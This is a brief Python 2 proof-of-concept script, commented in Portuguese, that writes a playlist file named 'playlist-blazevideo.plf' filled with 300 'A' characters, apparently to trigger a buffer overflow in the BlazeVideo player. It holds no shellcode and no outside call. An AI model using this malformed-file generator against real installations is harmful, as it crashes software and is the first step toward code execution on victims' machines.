#!/usr/bin/python

# POC de criacao de uma playlist para blazevideo

import struct
file = "playlist-blazevideo.plf"

payload = "A" * 300

f = open(file,'w')
print "Criando uma Playlist..."
f.write(payload)
print "Arquivo ",file, " Criado"
f.close()
